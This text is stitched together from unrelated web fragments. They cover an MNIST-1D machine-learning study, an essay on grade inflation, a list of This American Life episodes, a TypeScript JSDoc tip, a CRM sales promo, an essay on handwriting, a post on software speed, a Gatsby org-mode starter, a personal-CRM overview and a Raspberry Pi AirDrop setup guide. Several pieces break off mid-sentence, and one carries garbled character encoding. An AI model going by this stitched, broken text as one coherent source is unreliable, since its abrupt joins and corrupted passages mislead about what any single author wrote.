    <p>Next, in <b>e)</b> we permute the indices of the 1D signal, effectively removing spatial structure from the dataset. This ablation hurts lottery ticket performance significantly more, suggesting that part of the lottery ticket's performance can be attributed to a spatial inductive bias. Finally, in <b>f)</b> we keep the lottery ticket sparsity structure but initialize its weights with a different random seed. Contrary to results reported in <a href="https://arxiv.org/abs/1803.03635">Frankle &amp; Carbin (2019)</a>, we see that our lottery ticket continues to outperform a dense baseline, aligning well with our hypothesis that the lottery ticket mask has a spatial inductive bias. In <b>g)</b>, we verify our hypothesis by measuring how often unmasked weights are adjacent to one another in the first layer of our model. The lottery ticket has many more adjacent weights than chance would predict, implying a local connectivity structure which helps gives rise to spatial biases.</p>

<p>You can also visualize the actual masks selected via random and lottery pruning:  </p>





<p><strong>Observing deep double descent.</strong> Another intriguing property of neural networks is the “double descent” phenomenon. This phrase refers to a training regime where more data, model parameters, or gradient steps can actually <em>reduce</em> a model’s test accuracy<sup id="fnref:fn1" role="doc-noteref"><a href="#fn:fn1">1</a></sup> <sup id="fnref:fn2" role="doc-noteref"><a href="#fn:fn2">2</a></sup> <sup id="fnref:fn3" role="doc-noteref"><a href="#fn:fn3">3</a></sup> <sup id="fnref:fn4" role="doc-noteref"><a href="#fn:fn4">4</a></sup>. The intuition is that during supervised learning there is an interpolation threshold where the learning procedure, consisting of a model and an optimization algorithm, is just barely able to fit the entire training set. At this threshold there is effectively just one model that can fit the data and this model is very sensitive to label noise and model mis-specification.</p>

<p>Several properties of this effect, such as what factors affect its width and location, are not well understood in the context of deep models. We see the MNIST-1D dataset as a good tool for exploring these properties. In fact, we were able to reproduce the double descent pattern after a few hours of researcher effort. The figure below shows our results for a fully-connected network and a convolutional model. We also observed a nuance that we had not seen mentioned in previous works: when using a mean square error loss, the interpolation threshold lies at \(n * K\) model parameters where \(n\) is the number of training examples and \(K\) is the number of model outputs. But when using a negative log likelihood loss, the interpolation threshold lies at \(n\) model parameters – it does not depend on the number of model outputs. This is an interesting empirical observation that may explain some of the advantage in using a log likelihood loss over a MSE loss on this type of task. You can reproduce these results <a href="https://bit.ly/2UBWWNu">here</a>.</p>

						<p>“<a href="http://www.theatlantic.com/education/archive/2015/01/same-performance-better-grades/384447/">Same Performance, Better Grades: Academic achievement hasn’t improved much, so why are college-goers getting higher GPAs than ever before?</a>” doesn’t cite <a href="http://www.amazon.com/Academically-Adrift-Limited-Learning-Campuses/dp/0226028569?ie=UTF8&amp;tag=thstsst-20&amp;linkCode=as2&amp;camp=1789&amp;creative=390957"><em>Academically Adrift: Limited Learning on College Campuses</em></a>, though it should. Both the article and the book observe that grade inflation is real and doesn’t reflect increased student knowledge. But neither book nor article bring up an obvious question: What incentive does an individual professor have to grade honestly (or, as students might call it, “harshly”)?</p>
<p>When an individual professor grades students harshly, the students give low evaluation scores (which the article does, to its credit, note), but more importantly they can create a lot of extra work in the form of emails to be answered and, to a lesser extent, office hour visits generated. Much of htat work is not rewarding, intellectually or remuneratively, although office hours can be. Professors are rewarded primarily by producing research and in some schools to a lesser extent for getting high student evaluations, and grading honestly is counterproductive for either of those goals; it’s like a professional athlete honing his knitting skills.</p>
<p><a href="https://jakeseliger.com/2017/08/28/igen-jean-m-twenge-the-kids-arent-all-right/">Helicopter parenting</a> may also contribute to student expectations around grades, and administrator expectations that students’s input will be valued in terms of who to hire, fire, and promote. I haven’t experienced helicopter parenting first-hand, but I have heard the stories, and I have heard about grad students and adjuncts going to meetings based on low grades; the message gets disseminated even if it isn’t stated explicitly.</p>
<p>I’ve gotten lots of unhappy emails and, more rarely, calls from students. The perhaps most interesting ones come from students who plagiarized papers but thought I should excuse the plagiarism. In middle or high school perhaps that would be appropriate, but not college, and their efforts take time and mental energy to deal with. If even the plagiarizers want a hearing and elaborate negotiations and second chances, imagine the students who just wrote weak papers!</p>
<p>There’s no check on giving high grades, especially in squishy humanities courses like the ones I teach. The article says “Ultimately, grade inflation has severe consequences,” but then lists extremely un-severe consequences, like difficulty “for employers to vet the caliber of an applicant” (do employers actually do this?) or misleading students, “who often use their grades as benchmarks to help diagnose their strengths and weaknesses.” Some students do that but many don’t. The “severe consequences” paragraph feels like it was invented by a student for a paper.</p>
<p>Finally, the much-ballyhooed shift from tenured faculty to adjuncts means that even small or unjustified complaints can mean the difference between a given adjunct getting a course or not getting a course, if the opportunity is down to two, or a small number, of potential instructors. I’ve not heard of any adjunct, grad student, or instructor getting static for giving overly high grades. Give low grades or run a demanding class, though, and it can and does happen. Many adjunct decide to buckle up for safety’s sake, instead of going wild by not wearing that seatbelt.</p>
<p>Colleges mostly know that the students will pay tuition (or rather, their parents and their loan originators will) if they are happy with the educational product, and professors know they are more likely to keep getting paid if they have fewer student complaints rather than more. Colleges have set up programs that are designed to graduate students with limited skills but real tuition money. <em><a href="https://jakeseliger.com/2014/04/27/paying-for-the-party-elizabeth-armstrong-and-laura-hamilton/">Paying for the Party</a></em> by Elizabeth Armstrong and Laura Hamilton describes the consequences.</p>
<p>Want more serious grades? Provide the incentives to give them. Almost no one wants more serious grades.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span><span>F</span></span>irst broadcast in November 1995, <em>This American Life</em> is the most influential precursor to narrative podcasting as it exists today. Over the last 25 years, the show founded and led by Ira Glass has built a vast network of producers and writers who have set standards across all genres of audio production. Two of the biggest names in the podcasting boom — <em>Serial</em>’s Sarah Koenig and Gimlet Media’s Alex Blumberg — were deeply involved with the show’s golden age. Many other producers from that period: Starlee Kine, Brian Reed, Hillary Frank, Scott Carrier, Jonathan Goldstein, and former intern PJ Vogt, to name just a few, have gone on to create acclaimed podcasts of their own.</p><p>What makes a good <em>This American Life</em> story? The show’s <a href="https://www.thisamericanlife.org/about/submissions" target="_blank" rel="noopener noreferrer">submissions page</a> narrows it down to two principles: “There are characters in some situation, and a conflict,” and “[the] stories raise some bigger question or issue, some universal thing to think about.” But I would argue that the key ingredient is the contributor. The variety of styles on display in <em>This American Life </em>has separated the program from a traditional newsmagazine, whether that be <em>60 Minutes</em> or one found in print. And so, to make a list of the best episodes of <em>This American Life,</em> is to spotlight the work of the many staff and producers who make the show.</p><p>Surveying the following list, two things become apparent. First, episodes 300 to 400 (released from roughly 2006 to 2010) indeed constituted a kind of “golden age” for the show. During this period, production of <em>This American Life</em> moved from Chicago to New York (on account of the show’s <a href="https://www.thisamericanlife.org/node/43664" target="_blank" rel="noopener noreferrer">brief experimentation with television</a>), and the program became a force beyond itself. While much of the show’s first 10 years turned around the show’s home base of Chicago, once in New York, the show went global. It might be that no one takes you seriously until you’ve been at work for a decade, or it might just be that this was the moment Gen X became a silent majority of the culture industry. There was a political dimension to this: as the Bush administration tripped over itself in the wake of Hurricane Katrina, and the follies of the Iraq and Afghan Wars became ever more apparent, <em>This American Life</em> was perfectly positioned to reach into the heart of these major stories and record the shifting ground under life in these United States.</p><p>The second fact is that we like long episodes. During that same five-year period, <em>This American Life</em> began to earn its reputation for blockbuster, hour-long narratives that would carry it into the 2010s. Some of these episodes — “The Giant Pool of Money,” “#1 Party School” among them — are so legendary that one can now forget that the show’s bread and butter has always been its act-based structure. The power of this method, one which many podcasts, due to their niche focuses, can never quite live up to, is to find disperse stories on a theme and situate them together in a way that makes them resonate in new ways.</p><p>This resonance gives these stories, some of them goofy, nerdy, or downright silly, the power to reshape one’s feelings. While on the surface <em>This American Life</em> can fall prey to the kind of neoliberal ephemera people lambast public radio for, underneath there is a radical current that infuses many of the episodes that we’ve chosen here. The program can be a one-hour chapter of <em>The People’s History</em> delivered to radio each week. It puts the faults and frailties of the U.S. on naked display, stripped of the power, prestige, and distance that older and more traditional mediators dress them in. It is for this reason, and the ones listed below, that we find <em>This American Life</em> to be one of the greatest American journalism projects. <em>– Brendan Mattox</em></p><p><strong><a href="https://www.thisamericanlife.org/15/dawn" target="_blank" rel="noopener noreferrer">15: Dawn</a></strong></p><p>An early highlight of <em>This American Life</em> is “Dawn,” the episode first to give the entire hour over to a single contributor. Master storyteller and magazine journalist Jack Hitt’s work holds a strong influence over the first decade of the program. “Dawn” follows Hitt as he interviews old friends and family in Charlotte about a mysterious neighbor. Fans of the podcast <em>S-Town</em> will find much to love here, as the Faulkneresque story of the end of The Old South yields to a story about sexuality, gender, and the way that media inserts itself into the stories of our lives.</p><p><strong><a href="https://www.thisamericanlife.org/61/fiasco-1997" target="_blank" rel="noopener noreferrer">61: Fiasco!</a></strong></p><p>One of <em>This American Life</em>’s most rerun episodes, “Fiasco!” is a collection of masterful debacles. Everything goes wrong, at least once in a while. When it does, you can only hope someone is there to record the wreckage. A community theater’s attempt to dazzle in their production of <em>Peter Pan </em>shatters the fourth wall and a rookie cop succumbs to a devious foe (a squirrel). Each of the episode’s four acts investigates a doomed, hilarious series of errors.</p><p><strong><a href="https://www.thisamericanlife.org/80/running-after-antelope" target="_blank" rel="noopener noreferrer">80: Running After Antelope</a></strong></p><p>The legend about TAL contributor Scott Carrier (later explored in Carrier’s own podcast <em><a href="https://homebrave.com/" target="_blank" rel="noopener noreferrer">Home of the Brave</a></em>) is that he started making radio by hitchhiking, cross-country, from his home in Utah to the NPR headquarters in Washington, D.C. Arriving on a Saturday, he asked the first <em>Weekend Edition</em> producer who would listen to teach him how to make radio. Carrier is fiercely partisan, an outsider in every possible sense, and keenly unafraid to burn bridges. He writes like Hemingway, with brief language, quick movement, and constant grappling with the more toxic angles of masculinity. He can sound, at times, both dangerous and uniquely tuned to an unknown rhythm. All of these traits are on display in “Running After Antelope,” a 40-minute narrative of a decade-long attempt to chase down an antelope on foot, and how his desire to be “primitive” conflicted with the inexorable movement of time. Carrier would later get a full episode of <em>This American Life</em> dedicated to his work (<a href="https://www.thisamericanlife.org/181/the-friendly-man" target="_blank" rel="noopener noreferrer">181: The Friendly Man</a>).</p><p><strong><a href="https://www.thisamericanlife.org/109/notes-on-camp" target="_blank" rel="noopener noreferrer">109: Notes on Camp</a></strong></p><p>This episode is yet another example of <em>This American Life</em>’s ability to turn a mundane topic — in this case, stories from summer camp — into a meaningful exploration of our values. The camp stories are funny and awkward, as we all were during our early adolescent summers. The scary stories, first kisses, and halting efforts at adulthood that appear throughout the episode answer at least some of the questions they pose about community and the importance of being together.</p><p><strong><a href="https://www.thisamericanlife.org/172/24-hours-at-the-golden-apple" target="_blank" rel="noopener noreferrer">172: 24 Hours at the Golden Apple</a></strong></p><p>One of the hallmarks of <em>This American Life</em> is its commitment to telling stories of everyday life, eschewing the need for every episode to be relevant to the news. “24 Hours at the Golden Apple,” an episode with a rather literal title, shows this approach can be revelatory. In this episode, Glass and a few other producers spend the day at a local Chicago diner, from early morning until late into the night. We meet a regular who plays harmonica as the sun rises, a waitress who’s been working the night shift for the past 26 years, a pair of teen girls trying to corral friends to come join them at the diner, and many, many others.</p><p><strong><a href="https://www.thisamericanlife.org/199/house-on-loon-lake" target="_blank" rel="noopener noreferrer">199: House on Loon Lake</a></strong></p><p>In this engrossing episode, producer Adam Beckman tells the story of how, when he was eleven years old, he and two friends came across an abandoned house in the small town of Freedom, New Hampshire. The three boys dare each other to venture inside, and what they find — a crumbling newspaper, decaying clothes, old letters, and much more — hints that the home had been untouched for decades. From there, “a sort of real-life Hardy Boys mystery” commences, as Beckman and his friends work to uncover who lived in the house and the circumstances under which they had to leave.</p><p><strong><em>Want to receive our latest podcast reviews and episode recommendations via email? <a href="https://podcastreview.org/newsletter">Sign up here</a> for our weekly newsletter.</em></strong></p><p><strong><a href="https://www.thisamericanlife.org/205/plan-b" target="_blank" rel="noopener noreferrer">205: Plan B</a></strong></p><p>“Plan B”&nbsp;features stories from two of <em>This American Life</em>’s former contributors, John Hodgman and Jonathan Goldstein. In one sense, John Hodgman’s story, It’s Another Tequila Sunrise, is about Cuervo Man, Jose Cuervo’s Princeton-educated brand ambassador who seemingly exists to balance tequila shots on his head and be the life of the party. In another, it’s about fear and acceptance of who we are. Jonathan Goldstein faces similar considerations as he deals with his unexpected success as a telemarketer. Both segments wrap the discomfort of self-examination in the humor of Hodgman and Goldstein’s small absurdities.</p><p><strong><a href="https://www.thisamericanlife.org/220/testosterone" target="_blank" rel="noopener noreferrer">220: Testosterone</a></strong></p><p>The episode in which every <em>This American Life</em> crew member decides to measure their testosterone levels competition-style begins with Alex Blumberg’s quest to find out how much the hormone has shaped his life. Two excellent, extended interviews give this 2002 show its verve: one with a journalist whose body briefly stopped producing testosterone, one with a transgender man who noticed a series of astounding changes to his own thought patterns when he began testosterone injections. The episode doesn’t seek to prove anything, but hearing these two men, plus every TAL producer, try to understand how hormones inform their character is funny and fascinating.</p><p><strong><a href="https://www.thisamericanlife.org/241/20-acts-in-60-minutes" target="_blank" rel="noopener noreferrer">241: 20 Acts in 60 Minutes</a></strong></p><p>The entire cast of characters briefly guest star in the 2003 episode that abandoned the regular act-based structure for 20 mini-stories. Jonathan Goldstein tells a long joke. David Rakoff reveals his bad instincts. Starlee Kine finds the perfect punch line about low-level celebrity. David Sedaris finds out he’s been duped for years. Ira Glass discovers the mystery of Vienna Beef. The ultimate highlights of the experiment, Acts 6 and 20, tell two stories from separate juvenile detention centers.</p><p><strong><a href="https://www.thisamericanlife.org/266/im-from-the-private-sector-and-im-here-to-help" target="_blank" rel="noopener noreferrer">266: I’m from the Private Sector and I’m Here to Help</a></strong></p><p>If one wants to pinpoint the shift of <em>This American Life</em> towards its current reputation for intensely original reporting, a strong contender is this 2004 report on the employees of Custer Battles, one of the many private security contractors to flood Iraq in the wake of the United States contentious (and <a href="http://news.bbc.co.uk/1/hi/world/middle_east/3661134.stm">illegal</a>) invasion in 2003.

<p>Hi, in this post I will show how to use Typescript with static typings without needing a build step. I have also <a target="_blank" href="https://github.com/swordcss/swordcss">implemented this in my project SwordCSS</a>.</p>
<h2 id="installation">Installation</h2>
<p>We still need to install and configure Typescript though.</p>
<pre><code>$ <span>npm</span> install -D typescript
</code></pre><p><code>tsconfig.json</code>:</p>
<pre><code>{
  <span>"compilerOptions"</span>: {
    <span>"moduleResolution"</span>: <span>"node"</span>,
    <span>"module"</span>: <span>"CommonJS"</span>,
    <span>"target"</span>: <span>"ESNext"</span>,
    <span>"sourceMap"</span>: <span>false</span>,
    <span>"declaration"</span>: <span>false</span>,
    <span>"checkJs"</span>: <span>true</span>,
    <span>"allowJs"</span>: <span>true</span>
  }
}
</code></pre>
<p>You can change the options however you want, but make sure the last four <code>compilerOptions</code> are the same.</p>
<h2 id="jsdoc">JSDoc</h2>
<p>Now, let me give you an introduction to JSDoc. JSDoc is a format for commenting on and annotating Javascript code. Here is how you would use it with Typescript:</p>
<pre><code>

<span><span>function</span> <span>doingSomething</span>(<span>param1, param2</span>) </span>{
    doSomething(param1, param2)
}
</code></pre>
<p>Or at least that is how you would use it with functions. There are some other things you can do, and you can look at what is supported with JSDoc + Typescript.</p>
<p><strong>IMPORTANT</strong> You must have <code>//@ts-check</code> at the top of your file for it to be type checked.</p>

          <div>
            <div data-animation-name="slideInUp">
              <h2>Youâ€™ve launched your new productâ€¦ Now what? Time to Get Selling! Hereâ€™s how...</h2>

<p>While the transition from initial product development to sales sounds easy enough, the shift is actually one of the biggest challenges for entrepreneurs and startups. After months of long, hard work developing your product, the actual launch feels like the finish line. In fact, the race has just begun. You finally have something to offer, so now itâ€™s time to get selling. Make it rain.</p>

<p>But, you have no idea how to make a light drizzle, let alone a rainstorm. You need to find people who want your product and are willing to pay for it. Beyond friends and family, how do you find people interested in what you offer? You need leads and there are tools that can help you find them.</p>

<p>Lead generation <em>(or lead gen, as many entrepreneurs call it)</em> is the process of locating prospects that might be interested in your product so that you can reach out, introduce your product and start to get people interested. It helps you to start selling, which you need to create revenues, keep the lights on, and, ultimately, grow.</p>

<p>Of course, lead-gen is the start of the selling process. The sales cycle can be quite involved, including lead nurturing and conversion, but letâ€™s focus on lead-gen for now.</p>

<h2>How Do You Generate Leads?</h2>

<p>It all starts with understanding your target customer. Who actually needs the product you offer? Who is experiencing the problem your product solves? Is this a solution for large corporations, medium-sized companies, or small, emerging businesses? Or perhaps it appeals to individuals, to families, to retired homeowners or bicycle commuters or Parkour-practicing pet owners. To be successful, start with one target. You can expand with other campaigns to broaden your revenue streams down the road, but for now, focus on one.</p>

<p>Whoâ€™s the decision-maker for this solution within the organization. If you are offering accounting software, for example, you might want to target the Chief Financial Officer (CFO) and the financial team. For office cleaning products, youâ€™d want to reach office managers, and if itâ€™s an employee training program, youâ€™d target the HR team.</p>

<p>Traditionally, the sales team would seek out lists from organizations that reach the target audience -- often magazines or trade organizations. A list of CFO Magazine readers, for example, was the best way to reach leads who worked in finance. The rise of social media has changed this, providing new ways to interact with a target audience. Today, businesses need a better way to sell than simply making cold calls downs on a static list. You need dynamic solutions that find qualified leads and provide information that helps you sell better.</p>

<p>Fortunately, lead-gen has become automated and highly targeted. Drawing on lists, but also social information and data, lead-gen can provide a more detailed context to help you sell. Beyond finding CFOs who might want your product, look for a solution that helps you understand the preferences of each lead. What are the CFOâ€™s preferred social media channels? Is she active on LinkedIn? How long has she been the CFO? Does she belong to a professional organization? Is she quoted in business news articles?</p>

<p>To take advantage of these new techniques, look for Customer Relationship Management (CRM) solutions that can generate leads, provide rich information on each customer, and help you manage the experience throughout the entire customer lifecycle. While some stand-alone lead-gen applications can help, the integrated CRM approach will help you not only generate leads but convert them to loyal customers that can fuel your growth for years to come.</p>

<p>There are mM=any CRM solutions to choose from. The market leaders are effective for large, enterprise customers but are costly and can be overkill for small, emerging businesses. Seek out a CRM solution designed for start-ups and high-growth companies. You want a solution that will generate leads, help you start selling, and successfully move from pure product development to sales that will allow your company to survive and thrive â€” without the high cost or high-pressure upsell from the CRM provider.</p>

<p>Tapdesk is a CRM platform designed for companies as small as one solopreneur and is extremely effective for businesses with up to 250 users. Itâ€™s a solution designed to help startups get started, generate revenue, and begin to grow. It was built to make lead gen easy and straightforward, to help your company get selling.</p>

We are quickly embracing digital alternatives because they are more efficient and easy to use.</span></span></p><p><span><span>Holiday greetings are being written on WhatsApp or email because itâ€™s fast, grocery lists are written in a to-do app because itâ€™s convenient, and documents are being written in the cloud because itâ€™s collaborative. But the convenience has a downside.</span></span></p><p><span><span><span><span><strong>People are gradually forgetting how to write.</strong></span></span></span></span></p><p><span><span>Especially those whose languages depend on strokes and symbols like Chinese and Japanese. A </span><span><a href="https://www.youtube.com/watch?v=zxHskrqMqII" target="_blank" rel="noopener noreferrer">street-survey</a></span><span> by a popular YouTube channel, Asian Boss has showed that all of their Chinese interviewees have â€” to a certain extent â€” forgotten how to write certain words. A similar </span><span><a href="https://www.youtube.com/watch?v=sJNxPRBvRQg" target="_blank" rel="noopener noreferrer">street-survey</a></span><span> by That Japanese Man Yuta on YouTube reported the same outcome with native Japanese people. The main reason? Keyboards.</span></span></p><p><span><span><strong><span><span>But is this a bad thing? Yes and no.</span></span></strong></span></span></p><p><span><span>Yes, because writing will be a lost art but most importantly, there are evidences that suggest writing have certain cognitive benefits.</span></span></p><p><span><span>However, as a language-learner, this speeds up the process of learning. Rather than learning how to write complex characters, learners will only need to learn how to recognize them. Vocabulary flashcards and reading exercises are sufficient and more practical to learn characters.</span></span></p><p><span><span>Since the world is becoming less reliant on pen and paper, there is no need for casual â€” or even serious â€” language learners to learn how to write. Take the Japanese language proficiency exams for instance. There is no written exam at all, from beginner to advanced tests. All you need to know is how to read and comprehend conversations.</span></span></p><p><span><span>I personally havenâ€™t used a pen for serious writing in years. I am also learning various languages, like Mandarin and Arabic, by reading and typing instead of writing. Am I declining cognitively? I donâ€™t think so. I exercise every day, eat moderately, and read abundantly. Surely, thatâ€™s enough.</span></span></p><p><span><span>How do you feel about this?

<p>When building products, there are two things that seem extremely important: scope and speed to feedback.</p>

<p>If you can ruthlessly prioritize, you can focus. If you can tighten your feedback loops, you can iterate faster. Both of these things will allow you to move very fast in the right direction. But more than that, James Somers talks about the perceived weight of work being reduced dramatically by working quickly in general: <a href="http://jsomers.net/blog/speed-matters">Speed Matters</a></p>

<p>In essence, if something takes a long time, you will avoid it. If it happens quickly, you will do more of it.</p>

<p>The same thing is true of the end-user’s experience of the software itself. If they can focus and the software feels fast, they will use it more. The pleasure of using it makes you want to use it more. Craig Mod writes about this beautifully here: <a href="https://craigmod.com/essays/fast_software/">Fast Software, the Best Software</a></p>

<p>While reading up on feedback loops I ran across Andrew Certain’s explanation of how communication and consensus can cripple the feedback loops that allow software to be developed faster. In order to increase speed at Amazon, Bezos basically said to ditch the idea of avoiding duplication of effort in order to execute faster (read the whole thread!):</p>

<blockquote data-conversation="none"><p lang="en" dir="ltr">Part of the reason for Amazon's incredible success across a staggering array of ventures is our focus on pushing autonomy down as far as possible. Jeff said from the start, "I don't want to make communication more efficient - I want there to be less communication!"</p>— Andrew Certain (@tacertain) <a href="https://twitter.com/tacertain/status/1166039964582199297?ref_src=twsrc%5Etfw">August 26, 2019</a></blockquote>


<p>The cost of communication, transparency, and consensus was so high that it wasn’t worth the effort. It was actually better to get rid of cross-team communication and heavily segment the application in order to ship new products faster. Werner Vogels, Amazon’s CTO goes into more detail here: <a href="https://www.allthingsdistributed.com/2019/08/modern-applications-at-aws.html">Modern Applications at AWS</a>.</p>

<p>This is an almost heretical idea on its face and goes against a core tenant of software development: Don’t repeat yourself!</p>

<p>The ideas of ‘fail fast’ and ‘move fast and break things’ are now widely satirized. However, I think they’re still deeply true. Moving fast is exciting, just look at any new burgeoning software framework. People love to get involved in projects that really <em>feel</em> fast. They’re rewarding and there’s the most opportunity to really stand out and feel like your contribution matters.</p>

<p>Anything that slows you down should be looked at with skepticism and there should be insanely high value associated with the trade-off.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><p><a href="https://orgmode.org/worg/org-tutorials/org-publish-html-tutorial.html">org-mode export function</a> is great, but simple <code>html</code> + <code>css</code> is not going to cut it any more. To create a modern website using your org files, with <a href="https://www.gatsbyjs.com/">gatsby</a> as the backbone, simply do this:</p><pre><code>npm install -g gatsby-cli
gatsby new my-website https://github.com/orgapp/gatsby-starter-blorg</code></pre><p>It's one command away from getting it running locally. You will have a powerful website sitting on <a href="http://localhost:8000/">localhost:8000</a> afterwards. Which conveniently, also is a complete documentation of the tool.</p><pre><code><span>cd</span> gatsby-site 
npm run develop</code></pre><div><h2>What's in the Box</h2><p>You get all the benefits from <a href="https://www.gatsbyjs.com/">gatsbyjs</a>, the flagship tool for creating modern websites. It will net a pretty good score on Google's website evaluation tests.</p><figure><img src="https://www.huxiaoxing.com/static/web-dev-score-a9fb284db6549f60368aaf7f6a6bb65b.png"><figcaption>Google web.dev score of the starter project</figcaption></figure><p>Here is a list of the important (in my opinion) features you get right away.</p><div><h3>Optimised for SEO</h3><p>You get detailed metadata for every page. They came from your org file itself (properties, tags, description etc...). Open up inspector of this page, and you will see something like this:</p><figure><img src="https://www.huxiaoxing.com/static/seo-showcase-dd6e19910e92e589cfc0e656e5af1c34.png"><figcaption>SEO</figcaption></figure><p>Some of them will help boost your website visibility on the internet. The Twitter ones will make your pages look amazing when shared on Twitter.</p><figure><img src="https://www.huxiaoxing.com/static/post-tweet-preview-c50e2858c6fb8d5c1ad8156c88340505.png"><figcaption>tweet card preview</figcaption></figure></div><div><h3>Responsive Design</h3><p>Over time, more people will be reading your words on their tiny smartphone screens instead of a glorious 4K display like yours. Resize the window to see how it transforms into a different layout gracefully.</p></div><div><h3>Progressive Web App (PWA)</h3><p>I don't need my website to be as sophisticated as an <code>app</code>, but it is nice to add additional resistance to a bad network to it. Your website will pre-fetch content and cache it in the browser like an app. So the whole website works 100% even when your device is offline. Also clicking an internal link feels like pressing a button on an app.</p></div><div><h3>Blazing Fast</h3><p>Gatsby is fantastic when it comes to optimising your website for the modern internet. All the files are small and split in logical ways to minimise traffic required to open your website. Believe it or not, even though the whole thing is written in JavaScript and React, your website can render correctly with JavaScript turned off<sup id="fnr-1" data-label="1"><a href="#fn-1">[1]</a></sup>. Everything is rendered at build time.</p></div><div><h3>Dark Mode</h3><p>Colour is a personal thing. The point is, you can customise every single detail about them, and you get two sets of them.</p><figure><img src="https://www.huxiaoxing.com/static/dark-mode-showcase-3121722da7a4d2263bda64b8c1888243.png"><figcaption>light/dark mode side by side</figcaption></figure></div><div><h3>Highly Customisable</h3><p>Every bit of the website is customisable. From the header to footer, from the post layout to the date and tags. If you'd like, you can nuke everything and build them from scratch.</p></div></div><div><h2>Designed with org-mode user in mind</h2><p>In some sense, org-mode is similar to markdown. But it's so much more flexible. So people use it in all kinds of ways. The following features are tailored particularly for org-mode users.</p><ul><li>Not everyone likes to write their stories on a per-file basis, so you can publish posts at both headline level and/or file level.</li><li>Instead of massive configuration options in a JSON file, the configuration stays in your org files via <a href="https://orgmode.org/manual/In_002dbuffer-Settings.html">In-Buffer Settings</a> and <a href="https://orgmode.org/guide/Properties.html">Properties</a> wherever possible.</li></ul></div><div><h2>What's the Catch</h2><ul><li>You going to have to be okay with the fact that it's written in JavaScript.</li><li>It is react based, so if you want to go deep in the customisation game, you going to have to be comfortable with copy &amp; pasting, maybe tweaking some <code>jsx</code> or <code>tsx</code> files.</li></ul></div><div><h2>Getting Started</h2><p>Why reinventing wheels over and over when you can stand on the shoulders of the giants and just benefit from others' struggles? Obviously, the giants here are the open-source communities. That's the reason I built the org-mode parser <a href="https://github.com/orgapp/orgajs">orgajs</a> in JavaScript (TypeScript actually) in the first place, to integrate with the mass. With a couple of simple plugins, it works seamlessly with a well-established ecosystem (namely <a href="https://www.gatsbyjs.com/">gatsbyjs</a>). I am taking massive advantage of other people's work, and it goes along with the evolution of the ecosystem. I know us geeks won't ever be satisfied on pre-made stuff. That's why I create multiple levels of customisation points in the tool (articles coming later). If you have any issue or suggestions for the project, you can create issues. Or talk to <a href="https://twitter.com/xiaoxinghu">me on Twitter</a> directly. I would love to know your thoughts. If you are ready to <a href="https://orgapp.github.io/gatsby-starter-blorg/">Get Started</a>, do so.</p></div><dl id="footnotes"><dt>[1]</dt><dd><p>You do need JavaScript turned on when you want more dynamic pages that, for example, does data fetching at render time. Of cause you don't need any of that for your blog post pages since they are pre-rendered at build time.</p></dd></dl></div></div></section></div>]]>

                <p>Personal CRM — relationship management software for consumers — is not a new category. &nbsp;Early versions of <a href="https://en.wikipedia.org/wiki/Cardfile">Microsoft’s Cardfile</a> date back to 1985. Broadly defined, ‘personal CRM’ helps <em>individuals</em> build out their professional and personal networks. We attribute the term to individuals repurposing sales customer-relationship management (CRM) software such as Hubspot to manage their personal networks; creating “Personal CRM.” Phrases like “Social CRM” have been used to describe relationship management software for individuals <a href="https://www.forbes.com/sites/tomiogeron/2011/10/05/linkedin-acquires-social-crm-company-connected/#63ef5e0c6c3d">since 2011</a>.</p><p>This article details the current landscape of personal relationship management software.</p><h2 id="overview">Overview</h2><p>Personal CRM solutions in 2020 have a variety of target audience and key feature differentiators.

      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>In this article, we are going to get AirDrop running on a Raspberry Pi 3 (not B+, unfortunately) running Rasbian Stretch.
While AirDrop itself implements a HTTP-based protocol (see <a href="https://owlink.org/code/">OpenDrop</a>), it uses a dedicated Wi-Fi based link layer called Apple Wireless Direct Link (AWDL). In order to use AirDrop, we’ll enable AWDL capabilities on the Raspberry Pi using <a href="https://owlink.org/code/">OWL</a>, our open AWDL implementation. OWL is implemented as user space program and requires a Wi-Fi card with working monitor mode and frame injection.</p>

<h2 id="enable-monitor-mode-with-frame-injection">Enable monitor mode with frame injection</h2>

<p>Since the BCM43430A1 Wi-Fi chip in the RPi3 does not support monitor mode out-of-the-box, we’ll use <a href="https://nexmon.org/">Nexmon</a> to patch the firmware.
The following steps are adapted from the project’s <a href="https://github.com/seemoo-lab/nexmon/blob/master/README.md">README</a>.</p>

<p>First, we need to install some dependencies.</p>

<div><div><pre><code><span>sudo </span>apt update <span>&amp;&amp;</span> apt upgrade
<span>sudo </span>apt <span>install </span>raspberrypi-kernel-headers git <span>\</span>
                 libgmp3-dev gawk qpdf bison flex make
<span>sudo </span>apt remove wpasupplicant
</code></pre></div></div>

<p>Then, we prepare Nexmon…</p>

<div><div><pre><code>git clone https://github.com/seemoo-lab/nexmon.git
<span>cd </span>nexmon
<span>touch </span>DISABLE_STATISTICS
</code></pre></div></div>

<p>… and compile required libraries and tools.</p>

<div><div><pre><code><span>sudo </span>su
<span>if</span> <span>[[</span> <span>!</span> <span>-f</span> /usr/lib/arm-linux-gnueabihf/libisl.so.10 <span>]]</span><span>;</span> <span>then</span> <span>\</span>
   <span>cd </span>buildtools/isl-0.10/ <span>&amp;&amp;</span> ./configure <span>&amp;&amp;</span> make <span>&amp;&amp;</span> make <span>install</span> <span>&amp;&amp;</span> <span>\</span>
   <span>ln</span> <span>-s</span> /usr/local/lib/libisl.so <span>\</span>
         /usr/lib/arm-linux-gnueabihf/libisl.so.10 <span>&amp;&amp;</span> <span>\</span>
   <span>cd</span> ../../ <span>;</span> <span>fi
</span><span>source </span>setup_env.sh
make
<span>cd </span>utilities/nexutil/ <span>&amp;&amp;</span> make <span>&amp;&amp;</span> make <span>install</span> <span>&amp;&amp;</span> <span>cd</span> ../../
</code></pre></div></div>

<p>We are now ready to build and install the monitor mode firmware patch.</p>

<div><div><pre><code><span>cd </span>patches/bcm43430a1/7_45_41_46/nexmon/
make
make backup-firmware
make install-firmware
</code></pre></div></div>

<blockquote>
  <p>Note that the above step is only necessary for Wi-Fi chips/drivers where monitor mode and frame injection support is missing. Other chips using the ath9k driver such as the Atheros AR9280 work out-of-the-box. Since Nexmon does not offer frame injection for the BCM43455C0 chip yet, you currently cannot use OWL on a 3B+ model.</p>
</blockquote>

<h2 id="install-owl">Install OWL</h2>

